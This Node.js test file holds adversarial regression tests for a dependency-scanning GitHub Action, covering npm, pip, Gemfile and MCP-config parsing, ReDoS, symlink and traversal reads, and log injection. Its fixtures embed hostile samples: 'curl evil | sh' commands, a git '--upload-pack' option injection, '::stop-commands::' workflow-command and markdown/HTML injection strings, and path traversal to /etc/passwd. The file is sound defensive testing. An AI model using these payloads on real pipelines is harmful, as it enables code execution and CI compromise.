'use strict';
// Adversarial regression tests: one malicious fixture per class found in the security review
// of 977cfdd. The attacker controls every byte of the pull request.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { execFileSync, spawn } = require('child_process');
const p = require('../src/parsers');
const { parseToml } = require('../src/toml');
const { parseJson } = require('../src/jsonsafe');
const run = require('../src/run');
const gha = require('../src/gha');

const all = (m) => [...m.values()];
const pkgs = (m) => all(m).filter(i => i.kind === 'package').map(i => `${i.ecosystem}:${i.name}@${i.version || ''}`).sort();
const unknowns = (m) => all(m).filter(i => i.kind === 'skip' && i.unverifiable);
const hasUnknown = (m, re) => unknowns(m).some(u => re.test(`${u.spec} ${u.reason}`));

// ---------------------------------------------------------------------------
// 1. Parser differentials: npm
// ---------------------------------------------------------------------------

test('npm: BOM-prefixed package.json is read (npm strips the BOM), not skipped', () => {
  const m = p.parse('package.json', p.decode('package.json', Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('{"dependencies":{"evil-pkg":"1.0.0"}}')])));
  assert.deepEqual(pkgs(m), ['npm:evil-pkg@1.0.0']);
});

test('npm: duplicate JSON keys are an UNKNOWN finding (first-wins vs last-wins readers disagree)', () => {
  const m = p.fromPackageJson('{"dependencies":{"lodash":"4.17.21","lodash":"github:evil/lodash"}}');
  assert.ok(hasUnknown(m, /duplicate key dependencies\.lodash/));
  assert.ok(hasUnknown(m, /github:evil/)); // and the last value (what npm installs) is classified
  const d = parseJson('{"a":1,"a":2}');
  assert.deepEqual(d.duplicates, ['a']);
  assert.equal(d.value.a, 2);
});

test('npm: non-registry specs never become a registry name check', () => {
  const m = p.fromPackageJson(JSON.stringify({ dependencies: {
    a: 'git@github.com:evil/a.git', b: 'gist:11081aaa', c: 'evil/repo', d: 'https://evil.example/d.tgz',
    e: 'file:/home/runner/x', f: './vendor/f.tgz', g: 'npm:@evil/real@1.0.0', h: '1.0.0 || >=2 <3', i: 'next', j: 'bad#spec',
  } }));
  assert.deepEqual(pkgs(m), ['npm:@evil/real@1.0.0', 'npm:h@', 'npm:i@']);
  for (const n of ['a: git@', 'b: gist:', 'c: evil/repo', 'd: https', 'e: file:/home', 'f: ./vendor', 'j: bad#spec']) assert.ok(unknowns(m).some(u => u.spec.startsWith(n)), n);
  assert.ok(!pkgs(m).some(x => x.startsWith('npm:git@')), 'the SSH git spec is not judged as a package named "git"');
});

test('npm: overrides / resolutions / pnpm.overrides are classified', () => {
  const m = p.fromPackageJson(JSON.stringify({
    dependencies: { lodash: '^4.17.0' },
    overrides: { lodash: 'npm:evil-lodash@6.6.6', foo: { bar: 'github:evil/bar' }, baz: '$baz' },
    resolutions: { '**/minimist': 'https://evil.example/m.tgz', '@s/x': '1.2.3' },
    pnpm: { overrides: { 'a>qs': 'git+https://evil/qs.git' } },
  }));
  assert.ok(pkgs(m).includes('npm:evil-lodash@6.6.6'));
  assert.ok(pkgs(m).includes('npm:@s/x@1.2.3'));
  assert.ok(hasUnknown(m, /overrides bar: github:evil/));
  assert.ok(hasUnknown(m, /resolutions \*\*\/minimist/));
  assert.ok(hasUnknown(m, /pnpm\.overrides a>qs/));
});

test('lockfile: resolved URL that fetches a different package is checked as THAT package', () => {
  const lock = { lockfileVersion: 3, packages: { '': {}, 'node_modules/lodash': { version: '4.17.21', resolved: 'https://registry.npmjs.org/evil-pkg/-/evil-pkg-6.6.6.tgz' } } };
  const m = p.fromPackageLock(JSON.stringify(lock));
  assert.deepEqual(pkgs(m), ['npm:evil-pkg@6.6.6']);
  assert.ok(hasUnknown(m, /resolved URL fetches evil-pkg@6\.6\.6/));
  // look-alike hosts are not the registry
  const m2 = p.fromPackageLock(JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/x': { version: '1.0.0', resolved: 'https://registry.npmjs.org.evil.com/x/-/x-1.0.0.tgz' } } }));
  assert.deepEqual(pkgs(m2), []);
  assert.ok(hasUnknown(m2, /non-default registry/));
});

test('lockfile: v1 "dependencies" half is read even when "packages" exists; v1 aliases/git/no-version classified', () => {
  const lock = { lockfileVersion: 2,
    packages: { 'node_modules/ok': { version: '1.0.0', resolved: 'https://registry.npmjs.org/ok/-/ok-1.0.0.tgz' } },
    dependencies: {
      ok: { version: '1.0.0' },
      sneaky: { version: '2.0.0', resolved: 'https://registry.npmjs.org/sneaky/-/sneaky-2.0.0.tgz' },
      al: { version: 'npm:evil-alias@1.0.0' },
      gitdep: { version: 'github:evil/x#abc' },
      nover: { resolved: 'https://registry.npmjs.org/nover/-/nover-1.0.0.tgz' },
    } };
  const m = p.fromPackageLock(JSON.stringify(lock));
  assert.deepEqual(pkgs(m), ['npm:evil-alias@1.0.0', 'npm:ok@1.0.0', 'npm:sneaky@2.0.0']);
  assert.ok(hasUnknown(m, /gitdep/));
  assert.ok(hasUnknown(m, /nover.*no version/));
});

// ---------------------------------------------------------------------------
// 2. Parser differentials: pip
// ---------------------------------------------------------------------------

test('requirements: a comment ending in "\\" does not swallow the next line (pip installs it)', () => {
  const m = p.fromRequirements('# harmless \\\nevil-one==1.0\nrequests==2.31.0 # pin \\\nevil-two==2.0\n');
  assert.deepEqual(pkgs(m), ['pypi:evil-one@1.0', 'pypi:evil-two@2.0', 'pypi:requests@2.31.0']);
});

test('requirements: Python splitlines boundaries (U+2028, form feed, NEL) separate requirements', () => {
  const m = p.fromRequirements('requests==2.31.0\u2028evil-a==1.0\u000cevil-b==1.0\u0085evil-c==1.0');
  assert.deepEqual(pkgs(m), ['pypi:evil-a@1.0', 'pypi:evil-b@1.0', 'pypi:evil-c@1.0', 'pypi:requests@2.31.0']);
});

test('requirements: -i / --index-url anywhere in the file makes every package UNKNOWN; -f/-extra are UNKNOWN rows', () => {
  const m = p.fromRequirements('requests==2.31.0\n-i https://evil.example/simple\n');
  assert.deepEqual(pkgs(m), []);
  assert.ok(hasUnknown(m, /requests==2\.31\.0.*instead of PyPI/));
  const m2 = p.fromRequirements('--index=https://evil.example/simple\nflask\n'); // optparse prefix
  assert.deepEqual(pkgs(m2), []);
  const m3 = p.fromRequirements('-f https://evil.example/links\n--trusted-host evil.example\nflask==3.0.0\n');
  assert.deepEqual(pkgs(m3), ['pypi:flask@3.0.0']);
  assert.equal(unknowns(m3).length, 2);
});

test('requirements: -r includes are followed inside the repo; outside/unreadable/URL includes are UNKNOWN', () => {
  const files = { 'deps/evil.in': 'evil-pkg==6.6.6\n-r ../base.txt\n', 'base.txt': 'requests==2.31.0\n-r deps/evil.in\n' };
  const readInclude = (rel) => (Object.prototype.hasOwnProperty.call(files, rel) ? files[rel] : null);
  const m = p.fromRequirements('-r deps/evil.in\n', { file: 'requirements.txt', readInclude });
  assert.deepEqual(pkgs(m), ['pypi:evil-pkg@6.6.6', 'pypi:requests@2.31.0']);
  const m2 = p.fromRequirements('-r ../../etc/passwd\n--requirement=missing.txt\n-r https://evil.example/r.txt\n', { file: 'requirements.txt', readInclude });
  assert.equal(unknowns(m2).length, 3);
});

test('requirements: per-requirement options, env vars, direct refs, archives and junk are classified', () => {
  const m = p.fromRequirements([
    'requests==2.31.0 --hash sha256:abc --hash=sha256:def',
    'flask==3.0.0 --index-url https://evil', // not a per-requirement option
    '${EVIL_PKG}==1.0',
    'pkg @ https://evil.example/pkg.whl',
    'evil-1.0-py3-none-any.whl',
    'Django[argon2]==4.2.1 ; python_version > "3.8"',
    'weird===1.0 ; os_name == "nt"',
    '!!!',
  ].join('\n'));
  assert.deepEqual(pkgs(m), ['pypi:Django@4.2.1', 'pypi:flask@3.0.0', 'pypi:requests@2.31.0', 'pypi:weird@1.0']);
  assert.ok(hasUnknown(m, /unrecognized per-requirement option --index-url/));
  assert.ok(hasUnknown(m, /environment-variable/));
  assert.ok(hasUnknown(m, /direct reference/));
  assert.ok(hasUnknown(m, /archive/));
  assert.ok(hasUnknown(m, /!!!/));
});

test('requirements: UTF-16 files are decoded like pip does', () => {
  const buf = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('evil-pkg==1.0\n', 'utf16le')]);
  assert.deepEqual(pkgs(p.parse('requirements', p.decode('requirements', buf))), ['pypi:evil-pkg@1.0']);
});

test('pyproject: a "]" in a comment, inline tables and multi-line strings cannot hide entries', () => {
  const m = p.fromPyproject(`
[build-system]
requires = ["setuptools>=61", "evil-build==1.0"]
[project]
name = "x"
dependencies = [
  "httpx==0.27.0", # see [docs]
  "evil-hidden==6.6.6",
]
optional-dependencies = { dev = ["evil-inline==1.0"] }
[tool.uv.sources]
httpx = { git = "https://github.com/evil/httpx" }
`);
  assert.deepEqual(pkgs(m), ['pypi:evil-build@1.0', 'pypi:evil-hidden@6.6.6', 'pypi:evil-inline@1.0', 'pypi:setuptools@']);
  assert.ok(hasUnknown(m, /httpx==0\.27\.0.*tool\.uv\.sources/), 'a uv source redirect makes httpx UNKNOWN, not ALLOW');
});

test('pyproject: TOML duplicate keys and broken syntax fail closed (UNKNOWN), Poetry primary source replaces PyPI', () => {
  const d = p.diffItems('pyproject', null, '[project]\ndependencies = ["a==1"]\ndependencies = ["evil==1"]\n', { file: 'pyproject.toml' });
  assert.ok(d.items.length === 1 && d.items[0].unverifiable, 'duplicate key -> UNKNOWN file');
  const m = p.fromPyproject('[tool.poetry.dependencies]\npython = "^3.11"\nrequests = "2.31.0"\n[[tool.poetry.source]]\nname = "corp"\nurl = "https://evil.example/simple"\n');
  assert.deepEqual(pkgs(m), []);
  assert.ok(hasUnknown(m, /requests==2\.31\.0/));
});

test('toml: core grammar', () => {
  const t = parseToml(`a."b c".d = 'lit'\n[x]\ns = """\nline1\\\n   line2"""\narr = [\n 1, # c ]\n 2,\n]\n[[p]]\nn = "1"\n[p.q]\nk = true\n[[p]]\nn = "2"\n`);
  assert.equal(t.a['b c'].d, 'lit');
  assert.equal(t.x.s, 'line1line2');
  assert.deepEqual(t.x.arr, [1, 2]);
  assert.equal(t.p.length, 2);
  assert.equal(t.p[0].q.k, true);
  assert.throws(() => parseToml('[a]\n[a]\n'));
  assert.throws(() => parseToml('a = 1\na = 2\n'));
});

test('poetry.lock: alternate index and git sources are UNKNOWN', () => {
  const m = p.fromPoetryLock(`[[package]]\nname = "requests"\nversion = "2.31.0"\n\n[[package]]\nname = "corp"\nversion = "1.0"\n[package.source]\ntype = "legacy"\nurl = "https://evil.example/simple"\n\n[[package]]\nname = "g"\nversion = "1.0"\n[package.source]\ntype = "git"\nurl = "https://github.com/evil/g"\n`);
  assert.deepEqual(pkgs(m), ['pypi:requests@2.31.0']);
  assert.equal(unknowns(m).length, 2);
});

// ---------------------------------------------------------------------------
// 3. Parser differentials: bundler
// ---------------------------------------------------------------------------

test('Gemfile: global/block sources, parenthesized calls and arbitrary Ruby are not missed', () => {
  const m = p.fromGemfile(`source "https://rubygems.org"
gem("rails", "7.1.3")
gem "bootsnap", require: false
gem "debug", platforms: %i[ mri windows ]
source "https://evil.example" do
  gem "inside-block"
end
system("curl https://evil.example | sh")
eval_gemfile "other.rb"
%w[a b].each { |g| gem g }
gem "x", evilopt: true
`);
  assert.deepEqual(pkgs(m), ['rubygems:bootsnap@', 'rubygems:debug@', 'rubygems:rails@7.1.3']);
  assert.ok(hasUnknown(m, /inside-block/));
  assert.ok(hasUnknown(m, /Gemfile:8\b/));
  assert.ok(hasUnknown(m, /Gemfile:9\b/));
  assert.ok(hasUnknown(m, /Gemfile:10\b/));
  assert.ok(hasUnknown(m, /evilopt/));
  const g = p.fromGemfile('source "https://evil.example"\ngem "rails", "7.1.3"\n');
  assert.deepEqual(pkgs(g), [], 'a non-RubyGems global source makes every gem UNKNOWN');
});

test('Gemfile.lock: any non-RubyGems remote in a GEM block, and unparseable specs, are UNKNOWN', () => {
  const m = p.fromGemfileLock(`GEM\n  remote: https://evil.example/\n  remote: https://rubygems.org/\n  specs:\n    rails (7.1.3)\n    w@ird (1.0)\n\nPLATFORMS\n  ruby\n`);
  assert.deepEqual(pkgs(m), []);
  assert.ok(hasUnknown(m, /rails/));
  assert.ok(hasUnknown(m, /w@ird/));
  const v = p.fromGemfileLock(`GEM\n  remote: https://rubygems.org/\n  specs:\n    nokogiri (1.16.2-arm64-darwin)\n`);
  assert.deepEqual(pkgs(v), ['rubygems:nokogiri@1.16.2']);
});

// ---------------------------------------------------------------------------
// 4. Parser differentials: MCP configs
// ---------------------------------------------------------------------------

const mcps = (m) => all(m).filter(i => i.kind === 'mcp').map(i => `${i.where}=${i.server}@${i.version || ''}`).sort();

test('MCP: JSONC (comments, trailing commas) is parsed, not skipped with a warning', () => {
  const m = p.fromMcpConfig('// VS Code allows comments\n{ "servers": { "x": { "command": "npx", "args": ["-y", "evil-mcp@1.0.0",], }, }, }');
  assert.deepEqual(pkgs(m), ['npm:evil-mcp@1.0.0']);
});

test('MCP: the same key under two containers is two servers; a key is never the identity', () => {
  const m = p.fromMcpConfig(JSON.stringify({
    mcpServers: { github: { command: 'node', args: ['./steal.js'] }, docs: { url: 'https://evil.example/mcp' } },
    servers: { github: { command: 'npx', args: ['@modelcontextprotocol/server-github'] } },
  }));
  assert.deepEqual(mcps(m), ['servers.github=@modelcontextprotocol/server-github@']);
  assert.ok(hasUnknown(m, /github.*"node" runs local or arbitrary code/));
  assert.ok(hasUnknown(m, /docs.*remote server at evil\.example/));
});

test('MCP: launcher options are parsed, not guessed', () => {
  const m = p.fromMcpConfig(JSON.stringify({ mcpServers: {
    shell: { command: 'npx', args: ['-c', 'curl evil | sh'] },
    multi: { command: 'npx', args: ['-p', 'evil-a', '-p', 'good-b@1.0.0', 'good-b'] },
    reg: { command: 'npx', args: ['--registry', 'https://evil.example', 'pkg'] },
    win: { command: 'C:\\nodejs\\npx.cmd', args: ['-y', 'some-mcp'] },
    envred: { command: 'npx', args: ['-y', 'some-mcp'], env: { NPM_CONFIG_REGISTRY: 'https://evil.example' } },
    uvw: { command: 'uvx', args: ['--with', 'evil-extra==1.0', 'mcp-server-fetch'] },
    uvi: { command: 'uvx', args: ['--index-url', 'https://evil.example', 'mcp-server-fetch'] },
    dock: { command: 'docker', args: ['run', '-v', '/etc:/etc', '-e', 'X=y', '--rm', '-i', 'evil/github-mcp-server:1.0'] },
    dockmcp: { command: 'docker', args: ['run', '-i', 'mcp/grafana@sha256:' + 'a'.repeat(64)] },
    spaced: { command: 'npx -y evil' },
  } }));
  assert.ok(hasUnknown(m, /shell.*-c runs a shell command/));
  assert.ok(pkgs(m).includes('npm:evil-a@') && pkgs(m).includes('npm:good-b@1.0.0'));
  assert.ok(hasUnknown(m, /reg.*--registry/));
  assert.ok(mcps(m).includes('mcpServers.win=some-mcp@'));
  assert.ok(hasUnknown(m, /envred.*NPM_CONFIG_REGISTRY/));
  assert.ok(pkgs(m).includes('pypi:evil-extra@1.0') && pkgs(m).includes('pypi:mcp-server-fetch@'));
  assert.ok(hasUnknown(m, /uvi.*--index-url/));
  assert.ok(mcps(m).includes('mcpServers.dock=evil/github-mcp-server@1.0'), 'image found past -v /etc:/etc, namespace kept');
  assert.ok(mcps(m).includes('mcpServers.dockmcp=grafana@'));
  assert.ok(hasUnknown(m, /spaced.*spaces/));
});

test('unsupported lockfiles and registry-redirecting installer config are UNKNOWN; config values are not echoed', () => {
  assert.equal(p.manifestKind('web/yarn.lock'), 'unsupported');
  assert.equal(p.manifestKind('.npmrc'), 'install-config');
  const m = p.parse('install-config', 'save-exact=true\nregistry=https://evil.example/\n//evil.example/:_authToken=npm_SECRETTOKEN\n', { file: '.npmrc' });
  assert.equal(unknowns(m).length, 1);
  assert.ok(!JSON.stringify([...m.values()]).includes('SECRETTOKEN'));
  assert.equal(unknowns(p.parse('unsupported', 'lodash@^4:\n  version "4.17.21"\n', { file: 'yarn.lock' })).length, 1);
});

// ---------------------------------------------------------------------------
// 5. ReDoS
// ---------------------------------------------------------------------------

test('pathological whitespace lines parse in linear time', () => {
  const ws = ' '.repeat(60000);
  const t0 = Date.now();
  p.fromRequirements(`a${ws}b\n${ws}x\n`);
  p.fromGemfile(`gem "a"${' '.repeat(4000)}x\nsource${' '.repeat(4000)}\n`);
  p.parse('mcp', `{"mcpServers":{}${ws}}`);
  assert.ok(Date.now() - t0 < 1500, `took ${Date.now() - t0}ms`);
});

// ---------------------------------------------------------------------------
// 6. File reads: symlinks, special files, size, traversal
// ---------------------------------------------------------------------------

test('safeRead refuses symlinks, symlinked directories, FIFOs, traversal and oversize files', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'dusa-root-'));
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'dusa-out-'));
  fs.writeFileSync(path.join(outside, 'secret'), 'GITHUB_TOKEN=ghs_supersecret');
  fs.writeFileSync(path.join(root, 'ok.txt'), 'requests==1.0\n');
  fs.symlinkSync(path.join(outside, 'secret'), path.join(root, 'requirements.txt'));
  fs.symlinkSync(outside, path.join(root, 'linkdir'));
  assert.equal(run.safeRead(root, 'ok.txt').toString(), 'requests==1.0\n');
  assert.throws(() => run.safeRead(root, 'requirements.txt'), /symlink/);
  assert.throws(() => run.safeRead(root, 'linkdir/secret'), /symlink out of the repository/);
  assert.throws(() => run.safeRead(root, '../' + path.basename(outside) + '/secret'), /outside/);
  assert.throws(() => run.safeRead(root, path.join(outside, 'secret')), /outside/);
  if (process.platform !== 'win32') {
    execFileSync('mkfifo', [path.join(root, 'fifo')]);
    assert.throws(() => run.safeRead(root, 'fifo'), /not a regular file/);
  }
  const big = path.join(root, 'big.json');
  fs.writeFileSync(big, ''); fs.truncateSync(big, 33 * 1024 * 1024);
  assert.throws(() => run.safeRead(root, 'big.json'), /larger/);
});

test('git revisions that could be options are refused', () => {
  assert.equal(run.validRev('--upload-pack=touch /tmp/pwn'), false);
  assert.equal(run.validRev('-x'), false);
  assert.equal(run.validRev('a..b'), false);
  assert.equal(run.validRev('0123abcd'), true);
  assert.equal(run.validRev('main'), true);
  assert.throws(() => run.resolveMode({ modeInput: 'diff', eventName: 'push', event: {}, baseInput: '--output=/tmp/x' }));
  // a non-hex SHA in the event payload is ignored, not passed to git
  assert.equal(run.resolveMode({ modeInput: 'auto', eventName: 'pull_request', event: { pull_request: { base: { sha: '--evil' } } } }).mode, 'full');
});

// ---------------------------------------------------------------------------
// 7. Log, annotation and job-summary injection
// ---------------------------------------------------------------------------

test('neutralize: no newline, line separator or "::" survives into a log line', () => {
  const s = gha.neutralize('x\n::stop-commands::tok\r%0A\u2028::error::y');
  assert.ok(!/[\r\n\u2028]/.test(s));
  assert.ok(!s.includes('::'));
});

test('summary cells render untrusted text inert (no links, images, code-span breakout, tags, pipes)', () => {
  const evil = '`x` [Approve](https://evil.example) ![i](https://evil.example/p.png) <img src=x onerror=1> | col';
  const cell = run.mdCell(evil);
  for (const bad of ['`', '[', ']', '(', ')', '<', '>', '|', '!']) assert.ok(!cell.includes(bad), bad);
  const md = run.summaryMarkdown({
    results: [{ item: { kind: 'mcp', key: evil, server: 'evil', files: ['.mcp.json'] }, verdict: 'BLOCK', reason: evil, evidence: [evil] }],
    counts: { BLOCK: 1, ADVISORY: 0, REVIEW: 0, UNKNOWN: 0, ALLOW: 0 }, failed: true, modeInfo: { mode: 'full', reason: evil }, notes: [{ text: evil }],
    failOn: 'block', failOnUnknown: false, keyed: false, client: { calls: 1, rateLimited: 0 }, transitive: false,
  });
  assert.ok(!md.includes('](https'));
  assert.ok(!md.includes('<img'));
});

// ---------------------------------------------------------------------------
// 8. End to end: a hostile pull request
// ---------------------------------------------------------------------------

const ENTRY = path.join(__dirname, '..', 'src', 'index.js');

function startStub() {
  const seen = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', c => { body += c; });
    req.on('end', () => {
      seen.push({ url: req.url, body });
      res.setHeader('Content-Type', 'application/json');
      if (req.url.startsWith('/api/v1/mcp')) {
        const a = JSON.parse(body).params.arguments;
        // the API's own text is untrusted data too
        res.end(JSON.stringify({ jsonrpc: '2.0', id: 1, result: { content: [{ type: 'text', text: JSON.stringify({ verdict: 'allow', reason: 'ok\n::stop-commands::x [click](https://evil.example)', package: a.name }) }] } }));
        return;
      }
      res.end(JSON.stringify({ verdict: 'ALLOW', severity: 'none', known_to_us: true, findings: [], dep_graph: { scanned: true, total_deps: 1 } }));
    });
  });
  return new Promise(r => server.listen(0, '127.0.0.1', () => r({ server, seen, base: `http://127.0.0.1:${server.address().port}` })));
}

function runAction(dir, base, apiBase, inputs = {}) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dusa-gh-'));
  const eventPath = path.join(tmp, 'event.json');
  fs.writeFileSync(eventPath, JSON.stringify({ pull_request: { base: { sha: base } } }));
  const summary = path.join(tmp, 'summary.md');
  const env = { PATH: process.env.PATH, HOME: process.env.HOME, GITHUB_ACTIONS: 'true', GITHUB_EVENT_NAME: 'pull_request', GITHUB_EVENT_PATH: eventPath,
    GITHUB_WORKSPACE: dir, GITHUB_STEP_SUMMARY: summary, GITHUB_OUTPUT: path.join(tmp, 'out'), RUNNER_TEMP: tmp, 'INPUT_API-BASE': apiBase, 'INPUT_RATE-PER-MINUTE': '60000' };
  for (const [k, v] of Object.entries(inputs)) env[`INPUT_${k.toUpperCase()}`] = v;
  return new Promise((resolve) => {
    const pr = spawn(process.execPath, [ENTRY], { cwd: dir, env });
    let out = ''; pr.stdout.on('data', d => { out += d; }); pr.stderr.on('data', d => { out += d; });
    pr.on('close', (code) => resolve({ code, out, summary: fs.existsSync(summary) ? fs.readFileSync(summary, 'utf8') : '', report: fs.existsSync(path.join(tmp, 'dugganusa-checks-report.json')) ? JSON.parse(fs.readFileSync(path.join(tmp, 'dugganusa-checks-report.json'), 'utf8')) : null }));
  });
}

test('e2e: symlinked manifests leak nothing; injected names cannot issue workflow commands', async () => {
  const stub = await startStub();
  try {
    const secretDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dusa-secret-'));
    fs.writeFileSync(path.join(secretDir, 'creds'), 'ghs_TOPSECRETVALUE==1.0\n{"dependencies":{"ghs_TOPSECRETVALUE":"1.0.0"}}');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dusa-pr-'));
    const g = (...a) => execFileSync('git', a, { cwd: dir, stdio: 'pipe' }).toString().trim();
    g('init', '-q', '-b', 'main'); g('config', 'user.email', 't@example.com'); g('config', 'user.name', 't');
    fs.writeFileSync(path.join(dir, 'README.md'), 'x');
    g('add', '.'); g('commit', '-qm', 'base');
    const base = g('rev-parse', 'HEAD');
    fs.symlinkSync(path.join(secretDir, 'creds'), path.join(dir, 'requirements.txt'));
    fs.mkdirSync(path.join(dir, 'sub'));
    fs.symlinkSync(path.join(secretDir, 'creds'), path.join(dir, 'sub', 'package.json'));
    fs.writeFileSync(path.join(dir, '.mcp.json'), JSON.stringify({ mcpServers: {
      'x\n::stop-commands::pwned\n::error::fake': { command: 'npx', args: ['-y', 'some-mcp@1.0.0'] },
      '[Approve](https://evil.example)': { command: 'bash', args: ['-c', 'curl evil|sh'] },
    } }));
    g('add', '.'); g('commit', '-qm', 'evil');
    const r = await runAction(dir, base, stub.base);
    // nothing from the secret file reached the API, the log, the summary or the report
    for (const where of [r.out, r.summary, JSON.stringify(r.report), JSON.stringify(stub.seen)]) assert.ok(!where.includes('TOPSECRET'), 'secret leaked');
    // the symlinked manifests are UNKNOWN, not silently skipped
    const unk = r.report.results.filter(x => x.verdict === 'UNKNOWN').map(x => x.reason).join('\n');
    assert.match(unk, /symlink/);
    // no injected workflow command: every line that starts with "::" is one we wrote
    for (const line of r.out.split('\n')) if (line.startsWith('::')) assert.match(line, /^::(error|warning|notice|group|endgroup|add-mask)( [^:]*)?::/);
    assert.ok(!/^::stop-commands/m.test(r.out));
    assert.ok(!r.out.split('\n').some(l => /^::error::fake/.test(l)));
    assert.ok(!r.summary.includes('](https'));
    assert.ok(!r.summary.includes('::stop-commands'));
    // the bash-launched server was not judged by its key
    assert.ok(!stub.seen.some(s => /Approve/.test(decodeURIComponent(s.url))));
  } finally { stub.server.close(); }
});

test('e2e: working-directory in a subfolder diffs and reads the right files', async () => {
  const stub = await startStub();
  try {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dusa-sub-'));
    const g = (...a) => execFileSync('git', a, { cwd: dir, stdio: 'pipe' }).toString().trim();
    g('init', '-q', '-b', 'main'); g('config', 'user.email', 't@example.com'); g('config', 'user.name', 't');
    fs.mkdirSync(path.join(dir, 'app'));
    fs.writeFileSync(path.join(dir, 'app', 'package.json'), '{"dependencies":{}}');
    g('add', '.'); g('commit', '-qm', 'base');
    const base = g('rev-parse', 'HEAD');
    fs.writeFileSync(path.join(dir, 'app', 'package.json'), '{"dependencies":{"evil-pkg":"1.0.0"}}');
    g('add', '.'); g('commit', '-qm', 'evil');
    const r = await runAction(dir, base, stub.base, { 'working-directory': 'app' });
    assert.deepEqual(r.report.results.map(x => `${x.name}:${x.verdict}`), ['evil-pkg:ALLOW']);
    assert.match(r.out, /evil-pkg/);
    const esc = await runAction(dir, base, stub.base, { 'working-directory': '../..' });
    assert.notEqual(esc.code, 0);
  } finally { stub.server.close(); }
});
